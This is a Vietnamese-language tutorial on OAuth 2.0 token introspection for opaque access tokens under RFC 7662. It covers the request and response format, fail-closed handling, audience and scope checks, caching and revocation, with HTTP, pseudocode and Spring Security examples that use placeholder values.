# Introspection endpoint cho opaque token

## Mục tiêu học tập

Sau bài học này, bạn có thể:

- Giải thích **opaque access token** và vì sao Resource Server (RS) thường phải hỏi **Authorization Server (AS)** về trạng thái token thay vì tự đọc claims như JWT.
- Mô tả vai trò **introspection endpoint** theo RFC 7662 trong xác thực, phân quyền và vòng đời token.
- Phân tích request **HTTP POST**, tham số **token**, **token_type_hint** tùy chọn, yêu cầu TLS và xác thực/ủy quyền bên gọi introspection.
- Diễn giải response **active=true/false** và metadata tùy chọn: **scope, client_id, sub, aud, iss, exp, nbf, iat, jti, token_type**.
- Phân biệt token không hoạt động với caller introspection không hợp lệ và AS không khả dụng; xử lý **fail closed** đúng cách.
- Thiết kế RS kiểm **audience, scope, loại token, issuer, hạn sử dụng và permission trên tài nguyên/tenant**, không chỉ dựa vào active=true.
- Hiểu tradeoff giữa **cache introspection, độ mới revocation, latency và availability**, cùng sender-constraining DPoP/mTLS.
- Sử dụng ví dụ HTTP, Mermaid, Java/Spring Security, pseudocode và negative tests để đánh giá triển khai.

## 1. Introspection giải quyết vấn đề gì?

Trong OAuth 2.0, **access token** là credential mà client trình cho Resource Server để yêu cầu truy cập dữ liệu/hành động. Có hai kiểu phổ biến:

- **JWT access token:** chứa claims theo token profile; RS có thể xác minh chữ ký, issuer, audience và thời hạn bằng cấu hình khóa đáng tin.
- **Opaque access token:** là giá trị mà RS **không được giả định có thể tự giải mã hoặc lấy claims**. AS có thể lưu token dưới dạng reference tới grant record và quản lý trạng thái tập trung.

Ví dụ opaque token **giả**:

~~~text
EXAMPLE_OPAQUE_ACCESS_TOKEN_8nR31vkT
~~~

Nhìn chuỗi token trên, RS không thể biết một cách tin cậy:

- Token do AS nào cấp?
- Token đã bị revoke hoặc hết hạn chưa?
- Token dành cho Orders API hay Payments API?
- Token có scope **orders:read** không?
- Token thuộc principal/client nào?
- Token có bị ràng với sender key/certificate không?

**OAuth 2.0 Token Introspection** theo **RFC 7662** cung cấp giao thức để một RS được phép gửi token tới AS và nhận trạng thái cùng metadata cần thiết.

~~~text
Client -> Orders API: Bearer opaque access token
Orders API -> AS: HTTPS POST /introspect với token, xác thực RS
AS -> Orders API: JSON {active, metadata được phép}
Orders API: kiểm audience, scope, type, principal, permission
Orders API -> Client: dữ liệu hoặc từ chối
~~~

**Introspection không phát access token mới.** Nó cũng không thay việc RS kiểm quyền đối với từng tài nguyên.

## 2. Vai trò và trust boundary

| Bên | Trách nhiệm | Không được tự giả định |
| --- | --- | --- |
| **OAuth Client** | Xin access token đúng grant/resource/scope, gửi token tới API. | Có Bearer token là gọi được mọi API. |
| **Authorization Server** | Phát token, quản lý trạng thái, xác thực bên introspect, quyết định metadata được trả. | Mọi bên gửi token đều được quyền xem claims của token đó. |
| **Resource Server** | Lấy token từ request, introspect tại AS tin cậy, áp policy audience/scope/permission. | active=true đồng nghĩa mọi request hợp lệ. |
| **End-User/Resource Owner** | Có thể là chủ thể của một grant. | Mọi token đều gắn với End-User; client_credentials có thể là service principal. |

~~~mermaid
sequenceDiagram
    participant C as OAuth Client
    participant RS as Orders Resource Server
    participant AS as Authorization Server
    participant DB as Token/Grant Store

    C->>RS: GET /api/orders, Bearer opaque AT
    RS->>AS: HTTPS POST /introspect với token và RS authentication
    AS->>AS: Xác thực, ủy quyền RS được introspect
    AS->>DB: Tra token, grant, expiry, revocation
    DB-->>AS: Metadata và trạng thái
    AS-->>RS: active + metadata được phép
    RS->>RS: Kiểm type, issuer, aud, scope, quyền tài nguyên
    alt Mọi kiểm tra đạt
        RS-->>C: Dữ liệu được phép
    else Token hoặc quyền không hợp lệ
        RS-->>C: 401/403 theo tình huống
    end
~~~

**Hai quyết định khác nhau:**

1. AS xác định token có hoạt động và caller có được nhận metadata của nó không.
2. RS xác định token có **dành đúng API** và principal/client có được thực hiện hành động trên resource cụ thể không.

Một kết quả introspection không chuyển toàn bộ trách nhiệm phân quyền nghiệp vụ về AS.

## 3. Opaque token khác JWT như thế nào?

| Tiêu chí | Opaque access token | JWT access token |
| --- | --- | --- |
| **Định dạng** | Chuỗi opaque/reference theo AS. | JWT có header/payload và chữ ký theo profile. |
| **RS đọc claims trực tiếp?** | Không; cần cơ chế xác minh từ AS/store đáng tin. | Có thể sau khi xác minh chữ ký/issuer/thuật toán. |
| **Trạng thái thu hồi** | AS có thể trả active=false tại introspection. | JWT offline cần bổ sung denylist/introspection/TTL/policy nếu muốn thu hồi nhanh. |
| **Chi phí mỗi lần kiểm** | Có thể cần network round-trip hoặc cache. | Thường xác minh local nhanh hơn. |
| **Rủi ro bị sao chép** | Có nếu là Bearer token. | Có nếu là Bearer token. |
| **Audience/scope** | Metadata do AS trả theo hợp đồng. | Claims trong token đã ký theo profile. |
| **Sender-constraining** | Có thể hỗ trợ theo profile. | Có thể hỗ trợ theo profile. |

**Opaque không đồng nghĩa an toàn hơn JWT trong mọi trường hợp**. Nó giúp RS không phải tự đọc cấu trúc token và có thể hỗ trợ trạng thái tập trung. Nhưng nếu RS **bỏ kiểm audience/scope**, một opaque token active vẫn có thể bị dùng sai API.

Không viết:

~~~text
if token contains ".":
    trust decoded JWT
else:
    trust opaque token
~~~

Hình dạng chuỗi không chứng minh issuer/token type. RS phải có cấu hình về token profile và trust domain.

### Access, ID và refresh token có mục đích riêng

- **Access token** dành cho Resource Server.
- **ID token** trong OIDC là assertion xác thực dành cho Relying Party/client.
- **Refresh token** dành cho Authorization Server token endpoint để xin token mới.

Nếu AS nhận diện được một refresh token trong introspection, **RS vẫn không được coi đó là access token hợp lệ**.

## 4. RFC 7662 quy định giao diện nào?

**RFC 7662 — OAuth 2.0 Token Introspection** quy định:

- Endpoint nhận request **HTTP POST**.
- Body là **application/x-www-form-urlencoded**.
- Tham số **token** là bắt buộc.
- **token_type_hint** là tùy chọn, chỉ mang tính gợi ý.
- Endpoint **phải được bảo vệ bằng TLS**.
- AS cần **xác thực/ủy quyền bên gọi** để ngăn truy vấn token tùy tiện.
- Response JSON có trường **active** kiểu boolean bắt buộc.
- Các metadata khác **không phải lúc nào cũng được trả**.

Ví dụ các endpoint giả:

~~~text
Authorization endpoint:
    https://identity.example.test/oauth2/authorize

Token endpoint:
    https://identity.example.test/oauth2/token

Introspection endpoint:
    https://identity.example.test/oauth2/introspect
~~~

Tên đường dẫn chỉ là ví dụ. Nếu AS hỗ trợ metadata theo **RFC 8414**, cấu hình đáng tin có thể chứa **introspection_endpoint**. RS chỉ lấy URI này từ **issuer metadata/configuration được tin cậy**.

**Không lấy introspection URL từ query parameter, JWT header hoặc chính opaque token do caller gửi.** Điều đó có thể gây SSRF và lộ credential.

## 5. HTTP introspection request

Client gửi Bearer token tới Orders API:

~~~http
GET /api/orders?status=OPEN HTTP/1.1
Host: orders.example.test
Authorization: Bearer EXAMPLE_OPAQUE_ACCESS_TOKEN
~~~

Orders API gửi token tới AS:

~~~http
POST /oauth2/introspect HTTP/1.1
Host: identity.example.test
Authorization: Basic EXAMPLE_ORDERS_RS_AUTH
Content-Type: application/x-www-form-urlencoded
Accept: application/json

token=EXAMPLE_OPAQUE_ACCESS_TOKEN&token_type_hint=access_token
~~~

Các giá trị EXAMPLE chỉ để minh họa. Trong thực tế, kết nối phải là **HTTPS**, credential phải được bảo vệ. HTTP Basic dùng Base64, **không mã hóa bí mật**, nên không thay TLS.

### Các trường request

| Field | Bắt buộc? | Ý nghĩa |
| --- | --- | --- |
| **token** | Có. | Token RS muốn AS kiểm tra. |
| **token_type_hint** | Không. | Gợi ý loại token, ví dụ access_token để AS tối ưu lookup. |
| **RS authentication** | Theo chính sách AS, endpoint phải được bảo vệ. | Xác định và ủy quyền bên hỏi token. |
| **Profile-specific fields** | Tùy AS. | Ràng buộc metadata theo hợp đồng mở rộng. |

### token_type_hint không xác thực token type

Một caller có thể gửi token_type_hint=access_token ngay cả khi token thật không phải AT. **AS không được coi hint là chứng cứ**; RS cũng không được dùng hint thay việc kiểm loại token trong response/profile.

### Không gửi token trong URL

Sai:

~~~http
GET /oauth2/introspect?token=EXAMPLE_OPAQUE_ACCESS_TOKEN HTTP/1.1
Host: identity.example.test
~~~

URL có thể bị ghi vào proxy/access logs, analytics hoặc history. RFC 7662 sử dụng **POST form body**, và hệ thống vẫn phải redact **body chứa token** trong log.

## 6. Response khi token hoạt động

AS xác thực caller, xác minh token và trả một response minh họa:

~~~http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache

{
  "active": true,
  "client_id": "dashboard-web",
  "token_type": "Bearer",
  "scope": "orders:read",
  "sub": "pairwise-user-72a9",
  "aud": "https://orders.example.test/api",
  "iss": "https://identity.example.test",
  "iat": 1730000000,
  "nbf": 1730000000,
  "exp": 1730000900,
  "jti": "example-token-id"
}
~~~

Các NumericDate thuộc dữ liệu giả trong quá khứ, **không phải credential hiện hành**.

**active là trường bắt buộc của RFC 7662; nhiều trường khác là tùy chọn.** Không được mặc định mọi AS đều trả aud, iss, token_type, exp hoặc sub. RS cần hợp đồng metadata cụ thể để quyết định có đủ dữ liệu xác minh không.

### active=true nói gì?

Nó cho biết AS coi token **đang hoạt động tại thời điểm xử lý**, trong phạm vi thông tin mà AS được phép tiết lộ cho caller.

**Nó không tự nói rằng:**

- Token được cấp cho API hiện tại.
- Token có scope của endpoint.
- Principal có quyền tại tenant hay trên bản ghi.
- Token chắc chắn là access token, không phải loại token khác.
- Caller có proof của sender-bound token.
- Token không thể bị revoke sau response hoặc cache result.
- Hành động này tuân thủ business policy.

## 7. Ý nghĩa metadata trong response

| Trường | Ý nghĩa | Kiểm tra cần thiết |
| --- | --- | --- |
| **active** | Token đang hoạt động theo AS. | Chỉ tiếp tục nếu boolean true. |
| **client_id** | OAuth client đã nhận token. | Có thể áp allowlist client. |
| **scope** | Scope đã cấp, thường là chuỗi cách nhau bằng dấu cách. | Kiểm đúng scope endpoint, không substring. |
| **token_type** | Token type theo AS, ví dụ Bearer. | Chỉ nhận token profile được hỗ trợ. |
| **sub** | Subject theo issuer/grant. | Phân biệt End-User và service principal. |
| **aud** | Resource Server/bên nhận dự kiến. | Kiểm đúng identifier của RS hiện tại. |
| **iss** | Issuer phát token. | Kiểm issuer đáng tin. |
| **exp** | Token expiry theo NumericDate. | Kiểm hạn, giới hạn cache TTL. |
| **nbf** | Token chưa có hiệu lực trước thời điểm này. | Kiểm theo profile. |
| **iat** | Thời điểm token được phát. | Áp policy độ mới nếu cần. |
| **jti** | Token identifier. | Audit/revocation nếu profile dùng; không thay authz. |
| **username** | Tên thân thiện nếu AS cung cấp. | Không dùng làm identity key tin cậy. |

### Audience không phải client ID

Ví dụ:

~~~text
client_id = dashboard-web
aud = https://orders.example.test/api
~~~

client_id chỉ **ứng dụng được cấp token**, còn aud là **API được phép nhận token**. RS kiểm đúng aud không phải so client_id với tên API.

### Scope phải so nguyên giá trị

Ví dụ scope được cấp:

~~~text
orders:read orders:search
~~~

Đúng:

~~~text
required = "orders:read"
granted = splitBySpaces(scope)
allow only if required is an exact member of granted
~~~

Sai:

~~~text
scope.includes("read")
scope.startsWith("orders")
~~~

Tên scope tương tự hoặc chứa nhau không có nghĩa cùng quyền.

## 8. Response khi token không hoạt động

Token có thể:

- Không tồn tại ở AS.
- Đã hết hạn hoặc chưa thỏa thời điểm hiệu lực.
- Đã bị thu hồi.
- Có grant/client bị vô hiệu theo policy.
- Không thuộc loại AS hỗ trợ.
- Không được phép tiết lộ cho caller đang introspect.

Một response bảo vệ thông tin:

~~~http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "active": false
}
~~~

**HTTP 200 chỉ nói introspection request đã được xử lý**, không chứng minh access token hợp lệ.

RFC 7662 khuyến nghị **không trả thông tin thêm về inactive token ngoài active=false**. Điều này giúp hạn chế **token enumeration** và tiết lộ claims.

### Hành động của RS

1. Không tạo authenticated principal từ token.
2. Không thực hiện API action.
3. Trả lỗi thích hợp, thường HTTP **401** với Bearer error **invalid_token** theo RFC 6750.
4. Không log raw token.
5. Không gửi token thử lần lượt sang AS khác để tìm nơi trả active=true.

**active=false không phải lời mời bỏ xác minh** hay cấp quyền mặc định khi endpoint bận.

## 9. Phân biệt token inactive, caller không hợp lệ và AS unavailable

| Phản hồi introspection | Ý nghĩa | RS nên làm |
| --- | --- | --- |
| **HTTP 200, active=true**, schema và metadata hợp lệ | Token có thể tiếp tục qua authorization checks. | Kiểm type/iss/aud/scope/permission. |
| **HTTP 200, active=false** | Token không được AS xác nhận hoạt động. | Từ chối token. |
| **HTTP 401/403** | Credential/authorization của RS caller không hợp lệ. | Không cho phép, cảnh báo cấu hình. |
| **HTTP 5xx, timeout, lỗi TLS** | Không có kết quả xác minh đáng tin. | Fail closed, xử lý lỗi vận hành. |
| **HTTP 200 JSON malformed** | Không có metadata hợp lệ. | Fail closed và ghi cảnh báo. |
| **active=true nhưng aud sai** | Token hoạt động nhưng dành cho RS khác. | Từ chối. |
| **active=true nhưng scope thiếu** | Token hoạt động nhưng không đủ quyền endpoint. | Từ chối authorization. |

### A. Token inactive

~~~http
HTTP/1.1 200 OK
Content-Type: application/json

{"active":false}
~~~

RS trả 401 invalid_token theo Bearer profile.

### B. RS không được phép introspect

~~~http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="introspection"
~~~

Đây là **lỗi xác thực caller RS với AS**, không phải bằng chứng token inactive. Không chuyển HTTP 401 của AS thành active=true hoặc giả định mọi token đều bị revoke; cần điều tra credential và cấu hình.

### C. AS timeout/503

Nếu AS không trả kết quả, RS không xác minh được token. **Không cho phép request theo nhánh mặc định**. Có thể trả HTTP 503 cho client theo chính sách vận hành để phân biệt AS unavailable với token sai, nhưng **quyền truy cập vẫn bị chặn**.

### 401 và 403 khi trả API response

- **401 Unauthorized**: Bearer token thiếu/sai/không được chấp nhận.
- **403 Forbidden**: token/principal đã xác minh nhưng thiếu scope hoặc permission.

Đối với Bearer token, RFC 6750 định nghĩa các error như invalid_token và insufficient_scope. HTTP status chính xác còn tùy gateway/framework/chính sách; **không tiết lộ secret hoặc claims nhạy cảm trong error message**.

## 10. Quy tắc cốt lõi: active=true chưa đủ

Sai:

~~~text
if introspectionResponse.active == true:
    allowAllRequests()
~~~

Tốt hơn:

~~~text
ALLOW =
    response comes from configured trusted AS over authenticated TLS
    AND response.active is boolean true
    AND token type/profile is supported access token
    AND issuer is expected
    AND audience includes exact RS identifier
    AND token time constraints satisfy policy
    AND required scope is granted
    AND sender proof is valid when binding is required
    AND client/principal has permission
    AND resource/tenant policy allows action
~~~

Không thay **audience** bằng issuer hoặc scope. Không dùng role do browser gửi để thay quyền từ server.

### Khi thiếu aud hoặc metadata bắt buộc

Nếu RS được cấu hình **bắt buộc audience restriction**, nhưng AS trả active=true mà **không có aud**, RS không đủ thông tin để chấp nhận theo hợp đồng. Phải **từ chối hoặc dùng cơ chế ràng buộc recipient đáng tin đã thiết kế**, không tự suy token dành cho mọi API.

### Multiple issuers

Nếu RS hỗ trợ nhiều AS, không tự POST cùng một opaque token đến **mọi introspection endpoint**. Việc này làm lộ credential cho issuer không phát token. Phải có trusted issuer routing/context, hoặc tách trust domains/RS khi không xác định được issuer an toàn.

## 11. Quy trình ra quyết định ở Resource Server

~~~mermaid
flowchart TD
    A["Request có opaque Bearer token"] --> B{"Token/transport hợp lệ?"}
    B -->|Không| U["401 authentication failure"]
    B -->|Có| C["POST /introspect tới AS tin cậy"]
    C --> D{"HTTP/auth/JSON introspection hợp lệ?"}
    D -->|Không| S["Fail closed; báo lỗi vận hành"]
    D -->|Có| E{"active == true?"}
    E -->|Không| U
    E -->|Có| F{"Token type, iss, aud, thời gian đúng?"}
    F -->|Không| U
    F -->|Có| G{"Sender proof hợp lệ nếu cần?"}
    G -->|Không| U
    G -->|Có| H{"Scope endpoint đủ?"}
    H -->|Không| V["403 insufficient_scope"]
    H -->|Có| I{"Principal/tenant/resource permission đủ?"}
    I -->|Không| W["403/404 theo policy"]
    I -->|Có| OK["Thực thi nghiệp vụ"]
~~~

**Một request không được phép sửa dữ liệu, gửi email hoặc gọi downstream bằng quyền mạnh trước khi hoàn tất validation.**

Nếu có nhiều Authorization Server, hãy định tuyến token theo **trusted context**; không truy vấn thử mọi AS để tìm nơi trả active=true vì đó là credential exfiltration.

## 12. Authorization Server bảo vệ introspection như thế nào?

Introspection không chỉ là query database trả JSON cho mọi request. AS có trách nhiệm:

1. **Xác thực caller** bằng client_secret_basic, private_key_jwt, mTLS hoặc cơ chế hợp lệ được đăng ký và hỗ trợ.
2. **Ủy quyền caller** được introspect token nào; Orders RS không nhất thiết được đọc metadata token Payments.
3. **Tra token/grant** và đánh giá tồn tại, expiry, revocation, client/grant trạng thái, time constraints.
4. **Chỉ trả metadata cần thiết** theo quyền RS; tránh lộ PII, token inactive hoặc claims quá rộng.
5. **Bảo vệ truy vấn** bằng TLS, rate limiting, audit và quản lý kho token.
6. **Trả schema đúng**, không trả active là string hoặc mặc định thành true khi database lỗi.

Ví dụ policy:

~~~text
orders-rs:
    được introspect token dành cho Orders

payments-rs:
    được introspect token dành cho Payments

unregistered-caller:
    không được dùng introspection endpoint
~~~

### Active=false bảo vệ thông tin

Nếu token không tồn tại hoặc không được phép tiết lộ cho caller, AS có thể trả JSON chỉ chứa active=false. Đừng cung cấp username, client_id, scopes hay nguyên nhân chi tiết cho token inactive; điều đó có thể tạo **token enumeration oracle**.

### Token store

AS có thể lưu **lookup identifier/hash của opaque token entropy cao** thay vì lưu nhiều bản plaintext. Cần quản lý index, token uniqueness, lifecycle, cleanup và token revocation. Không log token raw trong database query/debug.

## 13. Pseudocode cho introspection endpoint phía AS

~~~text
function introspect(request):
    require HTTPS
    require POST with valid form body
    require exactly one nonempty token field

    caller = authenticateIntrospectionCaller(request)
    if caller invalid:
        return HTTP_401_WITHOUT_TOKEN_DETAILS

    if caller not authorized to introspect:
        return HTTP_403_WITHOUT_TOKEN_DETAILS

    token = request.form["token"]
    if token exceeds sizeLimit:
        return safeRequestError()

    hint = optionalTokenTypeHint(request)
    record = secureLookupToken(token, hint)

    if record missing:
        return HTTP_200_JSON({ "active": false })

    if not callerMayInspect(caller, record):
        return HTTP_200_JSON({ "active": false })

    if tokenExpiredOrRevokedOrGrantInvalid(record):
        return HTTP_200_JSON({ "active": false })

    metadata = allowedMetadataForCaller(caller, record)

    return HTTP_200_JSON({
        "active": true,
        "client_id": metadata.clientId,
        "token_type": metadata.type,
        "scope": metadata.grantedScopes,
        "aud": metadata.audience,
        "iss": metadata.issuer,
        "sub": metadata.subject,
        "iat": metadata.issuedAt,
        "nbf": metadata.notBefore,
        "exp": metadata.expiresAt
    })
~~~

**Pseudocode không phải AS production.** Ngoài active, các trường có thể được bỏ nếu không có dữ liệu hoặc caller không được xem. AS phải bảo vệ client authentication, replay/rate limits, DB errors, privacy policy và token lifecycle theo kiến trúc.

Một caller không đủ quyền không được lấy lý do nội bộ cụ thể khiến token bị vô hiệu.

## 14. Pseudocode authorization tại Orders API

~~~text
function getOrder(request):
    bearer = strictParseOneBearerCredential(request)
    if bearer missing or malformed:
        DENY_401()

    response = trustedAsClient.introspect(
        endpoint = configuredIntrospectionUri,
        rsAuthentication = dedicatedOrdersCredential,
        token = bearer,
        tokenTypeHint = "access_token"
    )

    if response HTTP/auth/schema invalid:
        FAIL_CLOSED_WITH_OPERATIONAL_ERROR()

    if response.active is not boolean true:
        DENY_401()

    requireTrustedIssuer(response.iss)
    requireSupportedAccessTokenType(response.token_type)
    requireAudience(response.aud, "https://orders.example.test/api")
    requireValidTimes(response.exp, response.nbf)

    if senderProofRequired:
        requireProofMatchesTokenAndCurrentRequest(request, response)

    scopes = exactScopeSet(response.scope)
    if "orders:read" not in scopes:
        DENY_403("insufficient_scope")

    principal = trustedPrincipal(
        issuer = response.iss,
        subject = response.sub,
        clientId = response.client_id
    )

    order = database.loadOrder(request.orderId)
    if not policy.canRead(principal, order.tenant, order):
        DENY_403()

    return safeOrderRepresentation(order)
~~~

Các điều kiện chính:

- **audience** được so chính xác với resource identifier đáng tin.
- **scope** được parse thành tập giá trị, không kiểm substring.
- **sub** có thể là user hoặc service principal, tùy grant/profile.
- **tenant** phải được đối chiếu với dữ liệu thực, không chỉ từ X-Tenant-Id do caller tự điền.
- **token_type_hint không phải chứng cứ** và không thay trường token type/profile.
- Không lấy AS endpoint hay expected audience từ request Internet.

## 15. Java/Spring Security: cấu hình opaque token introspection

Spring Security Resource Server có giao diện **OpaqueTokenIntrospector** để gọi AS và nhận principal từ kết quả introspection.

~~~java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.Customizer;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.oauth2.server.resource.introspection.NimbusOpaqueTokenIntrospector;
import org.springframework.security.oauth2.server.resource.introspection.OpaqueTokenIntrospector;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
public class OrdersOpaqueTokenSecurity {

    private static final String INTROSPECTION_URI =
            "https://identity.example.test/oauth2/introspect";

    @Bean
    OpaqueTokenIntrospector tokenIntrospector() {
        // Demo: nạp credential từ secret manager/config an toàn.
        String rsClientId = System.getenv("ORDERS_RS_CLIENT_ID");
        String rsSecret = System.getenv("ORDERS_RS_INTROSPECTION_SECRET");

        return new NimbusOpaqueTokenIntrospector(
                INTROSPECTION_URI,
                rsClientId,
                rsSecret
        );
    }

    @Bean
    SecurityFilterChain apiChain(HttpSecurity http) throws Exception {
        http
            .securityMatcher("/api/**")
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/orders/**")
                    .hasAuthority("SCOPE_orders:read")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth ->
                oauth.opaqueToken(Customizer.withDefaults())
            );

        return http.build();
    }
}
~~~

### Giới hạn của ví dụ

- Đây là ví dụ **kiến trúc**, chưa phải Resource Server production đầy đủ.
- Một số constructors/classes có thể thay đổi hoặc deprecated tùy phiên bản Spring Security; khi triển khai dùng API thực tế của dự án.
- **audience, issuer, token type, exp/nbf** vẫn cần validator/hợp đồng metadata đáng tin. Không mặc định chỉ bật introspection đã kiểm đầy đủ các điều kiện của API.
- Scope phải được ánh xạ đúng **GrantedAuthority**, và authorization rule cần kiểm method/route/tenant cụ thể.
- Client secret phải ở secret manager, xoay vòng, không commit hoặc log.
- Thêm HTTP timeout, TLS/certificate validation, connection pooling, rate limits và cache policy.
- Nếu dùng DPoP/mTLS-bound AT, cần proof validation ở RS/gateway.
- Phân biệt lỗi AS 401/503 với **active=false**, fail closed đúng cách.

## 16. Java: kiểm audience trên metadata introspection

Dưới đây là **wrapper quanh introspector đã đáng tin**, không tự làm HTTP call. Nó chặn opaque token không dành cho Orders.

~~~java
import java.util.Collection;
import java.util.Objects;

import org.springframework.security.oauth2.core.OAuth2AuthenticatedPrincipal;
import org.springframework.security.oauth2.server.resource.introspection.OAuth2IntrospectionException;
import org.springframework.security.oauth2.server.resource.introspection.OpaqueTokenIntrospector;

public final class OrdersAudienceIntrospector
        implements OpaqueTokenIntrospector {

    private static final String EXPECTED =
            "https://orders.example.test/api";

    private final OpaqueTokenIntrospector delegate;

    public OrdersAudienceIntrospector(OpaqueTokenIntrospector delegate) {
        this.delegate = Objects.requireNonNull(delegate);
    }

    @Override
    public OAuth2AuthenticatedPrincipal introspect(String token) {
        OAuth2AuthenticatedPrincipal principal = delegate.introspect(token);

        Object audience = principal.getAttribute("aud");
        boolean matches = EXPECTED.equals(audience);

        if (!matches && audience instanceof Collection<?> items) {
            matches = items.contains(EXPECTED);
        }

        if (!matches) {
            throw new OAuth2IntrospectionException(
                "Access token audience mismatch"
            );
        }

        return principal;
    }
}
~~~

Một cách kết nối (mã minh họa):

~~~java
OpaqueTokenIntrospector delegate =
        new NimbusOpaqueTokenIntrospector(
            trustedIntrospectionUri,
            rsClientId,
            rsSecret
        );

OpaqueTokenIntrospector forOrders =
        new OrdersAudienceIntrospector(delegate);
~~~

**Wrapper chỉ kiểm aud**, không kiểm issuer, token type, scope hay business permission. Ví dụ cho phép aud là string hoặc collection có chứa Orders; nếu contract yêu cầu **single-audience**, phải từ chối collection có nhiều audiences. Trường aud thiếu cũng phải bị từ chối theo policy.

Không dùng wrapper trên JSON metadata do client HTTP tự khai. **Delegate phải xác minh kết quả introspection thực sự đến từ AS đáng tin**.

## 17. Introspection của service token và phân quyền multi-tenant

Một response có thể là:

~~~json
{
  "active": true,
  "client_id": "nightly-report-worker",
  "sub": "nightly-report-worker",
  "aud": "https://orders.example.test/api",
  "scope": "orders:read",
  "token_type": "Bearer"
}
~~~

Nó có thể là access token của **client_credentials grant**, không phải ID của user đang login.

Nếu endpoint đòi End-User duyệt đơn, active=true/aud đúng vẫn **không đủ**. RS cần kiểm principal type, scope orders:approve, permission theo tenant và các quy tắc nghiệp vụ như separation of duties.

Ví dụ worker chỉ được đọc tenant-blue nhưng request dữ liệu tenant-green:

~~~http
GET /api/tenants/tenant-green/orders HTTP/1.1
Host: orders.example.test
Authorization: Bearer EXAMPLE_OPAQUE_ACCESS_TOKEN
~~~

RS phải xác định tenant thật của tài nguyên và đánh giá quyền của principal. Không tin hoàn toàn path hoặc X-Tenant-Id do client tự điền.

Một subject identifier cần được diễn giải theo **issuer và principal type**; không tự đồng nhất service có sub=admin với một End-User admin.

## 18. Token type và principal mapping không được suy diễn

Các token khác nhau có thể cùng được AS lưu trong token store. Một refresh token vẫn có thể được AS nhận diện, nhưng **Resource Server không được chấp nhận RT làm access token**.

Nếu introspection metadata không cung cấp đủ dữ liệu để phân biệt token type theo contract, RS cần cơ chế xác minh bổ sung hoặc từ chối. token_type_hint từ request **không thay bằng chứng loại token**.

Tương tự:

- **ID token OIDC** dành cho client/Relying Party, không phải Bearer AT của Orders API.
- **Access token** dành cho API theo aud.
- **Refresh token** chỉ dùng tại AS token endpoint theo grant.
- **Service access token** không mặc định mang End-User identity.

Một JWT token có chữ ký đúng cũng không tự trở thành access token cho mọi API nếu type/audience sai. Quy tắc phân tách mục đích phải được áp nhất quán cho token opaque qua introspection.

## 19. Cache introspection: hiệu năng và độ mới trạng thái

Với opaque token, một RS có thể cần network round-trip đến AS ở mỗi request. Khi tải lớn, điều này tăng latency, phụ thuộc availability của AS và áp lực lên token store.

**Cache introspection** có thể giảm chi phí nhưng tạo **cửa sổ chấp nhận trạng thái cũ**.

### Ví dụ revoke trong thời gian cache

~~~text
10:00:00  RS introspect T, AS trả active=true, exp còn 10 phút.
10:00:10  RS cache kết quả với TTL 90 giây.
10:00:30  AS revoke T.
10:01:00  RS có thể còn dùng cached active=true.
10:01:40  Cache hết hạn; lần introspect mới trả active=false.
~~~

Nếu request có tác động tài chính lớn, 90 giây chậm phản ánh revocation có thể **không chấp nhận được**. Với một API dữ liệu ít nhạy cảm, tổ chức có thể chọn TTL khác dựa trên risk/SLA.

### Giới hạn TTL cache

Một công thức khái niệm:

~~~text
cacheExpiry = min(
    now + configuredMaxCacheTtl,
    tokenExp - safetyMargin
)
~~~

Chỉ có thể dùng công thức khi exp có mặt và được hiểu đúng. Ngoài ra cần:

- Giới hạn độ trễ tối đa cho token revocation và client/grant disable.
- Không cache vĩnh viễn response thiếu exp khi hợp đồng bắt buộc exp.
- Tách cache theo **issuer, token identity và Resource Server caller context**.
- Không dùng kết quả do AS trả riêng cho Payments RS để cho Orders RS.
- Giữ metadata cache an toàn: có thể chứa sub/PII và scope.
- Có eviction, max-size, rate limits, concurrency và metrics rõ ràng.

### Cache key sai có thể gây lộ quyền

Sai:

~~~text
cacheKey = clientId
cacheKey = token.substring(0, 4)
cacheKey = token_type_hint
~~~

Tốt hơn là key dựa trên token chính xác hoặc fingerprint **chống collision**, issuer và RS disclosure context, cùng policy version khi ảnh hưởng kết quả.

Dùng HMAC fingerprint có khóa nội bộ cho telemetry có thể tránh ghi raw token vào logs; không lưu token plaintext trong labels hoặc error messages.

### Negative cache và lỗi AS

Cache active=false ngắn có thể giúp chống token enumeration/rate abuse, nhưng không được nhầm:

- **active=false** là một response hợp lệ từ AS.
- **timeout/HTTP 503/HTTP 401 caller failure** là lỗi xác minh hoặc vận hành, không phải chứng cứ token inactive.

Không lưu HTTP 503 thành active=true hay tự bật bypass authentication khi AS quá tải.

### Single-flight và circuit breaker

Nếu cùng token được dùng cho 100 request đồng thời khi cache trống, RS có thể gom các introspection calls theo cùng **token/context**. Nhưng không dùng token khác để thay và không kéo dài cache quá policy. Circuit breaker phải bảo vệ availability mà vẫn **fail closed về quyền**.

## 20. Revocation, TTL và trạng thái động

**RFC 7009 OAuth Token Revocation** cung cấp giao thức thu hồi token trong những ngữ cảnh hỗ trợ. Một AS cũng có thể làm token inactive khi:

- Client bị vô hiệu/credential bị khóa.
- Grant bị thu hồi.
- RT family bị revoke theo security policy.
- Token hết hạn, bị đánh dấu compromised hoặc không còn thỏa state policy.

~~~mermaid
sequenceDiagram
    participant C as Client
    participant RS as Orders API
    participant AS as Authorization Server

    C->>RS: Bearer token T
    RS->>AS: Introspect T
    AS-->>RS: active=true
    RS->>RS: Cache kết quả theo TTL
    C->>AS: Revoke T theo quyền/policy
    AS-->>C: Revocation response
    C->>RS: Thử dùng T lần nữa
    Note over RS: Cache cũ có thể còn active=true
    RS->>AS: Introspect sau TTL hoặc invalidation
    AS-->>RS: active=false
    RS-->>C: 401 invalid_token
~~~

**Introspection làm trạng thái token có thể được kiểm tập trung, nhưng không bảo đảm thu hồi tức thì tại RS nếu có cache hoặc replication lag.**

### JWT offline so với opaque online

Một RS kiểm JWT hoàn toàn offline thường dựa vào exp và cơ chế riêng để cập nhật trạng thái. Với opaque token, RS hỏi AS có thể biết revoke gần thời gian thực hơn, **nhưng độ trễ phụ thuộc mỗi lần kiểm và cache**.

